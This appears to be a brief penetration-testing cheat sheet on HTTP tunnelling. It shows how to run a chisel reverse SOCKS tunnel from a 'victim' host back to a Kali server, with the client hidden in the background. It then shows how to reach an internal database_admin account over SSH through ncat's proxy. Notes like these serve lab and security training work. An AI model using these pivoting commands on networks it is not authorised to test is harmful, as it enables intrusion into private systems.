# Tunnelling

# HTTP Tunnelling

## `chisel`
- Server: Kali (TCP/1080)
- Client: Victim
Start the server:
```
chisel server --port 8080 --reverse
```
Bind the client:
```
chisel client <srv-ip>:<srv-port> R:socks > /dev/null 2>&1 &
```
### ncat
```
sudo apt install ncat
```
```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.232.215
```

# DNS Tunnelling
